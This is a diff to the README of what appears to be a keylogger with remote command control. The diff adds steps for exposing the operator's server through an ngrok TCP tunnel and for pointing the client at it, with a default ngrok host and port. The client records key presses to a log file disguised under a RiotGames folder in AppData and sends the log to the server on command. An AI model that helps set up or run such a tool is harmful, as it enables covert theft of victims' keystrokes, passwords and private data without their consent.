@@ -40,11 +40,49 @@ The `server.py` script performs the following tasks:
 2. The server will listen for incoming connections from clients.
 3. Once a client connects, the server operator can interact with the client by selecting it from the list of active clients and sending commands.
 
+#### Hosting with ngrok (Optional)
+
+You can use **ngrok** to easily expose your local server to the internet. Follow these steps to use ngrok:
+
+1. **Download and install ngrok**:
+
+   - Go to [ngrok.com](https://ngrok.com/) and sign up for a free account.
+   - Download the appropriate version for your operating system and extract the file.
+2. **Start the server**:
+
+   - Run the `server.py` script to start your server.
+3. **Expose the local server using ngrok**:
+
+   - Open a terminal or command prompt and navigate to the directory where `ngrok` is installed.
+   - Run the following command to expose your local server on port `65432` (or the port your server is using):
+     ```bash
+     ngrok tcp 65432
+     ```
+4. **Get the ngrok address**:
+
+   - After running the command, ngrok will display a forwarding address like `tcp://0.tcp.ngrok.io:XXXXX`, where `XXXXX` is a randomly assigned port number. This is the address you will use for the client to connect remotely.
+5. **Update the client configuration**:
+
+   - In the `client.py` script, update the server address to the one provided by ngrok. For example:
+     ```python
+     HOST = "0.tcp.ngrok.io"  # Replace with your ngrok address
+     PORT = XXXXX  # Replace with the ngrok port number
+     ```
+6. **Provide the ngrok address**:
+
+   - Share the ngrok address (`0.tcp.ngrok.io:XXXXX`) with the client, so it can connect to your server remotely.
+
 ### Running the Client
 
-1. Start the client by running `client.py`.
-2. The client will attempt to connect to a remote server on port `xxxxx`.
-3. The client will log key presses to `AppData/Roaming/RiotGames/log.txt` and send the log file to the server when prompted.
+1. **Start the client**:
+
+   - Run the `client.py` script to start the client.
+2. **Connect the client to the server**:
+
+   - The client will attempt to connect to the server. By default, the server is set to `6.tcp.eu.ngrok.io` on port `13223`. However, if you're using ngrok, you need to replace this with the address provided by ngrok (e.g., `0.tcp.ngrok.io:XXXXX`).
+3. **Logging and sending data**:
+
+   - The client will log key presses to a file located at `AppData/Roaming/RiotGames/log.txt`. When prompted, the client will send the log file to the server.
 
 ### Available Commands
 
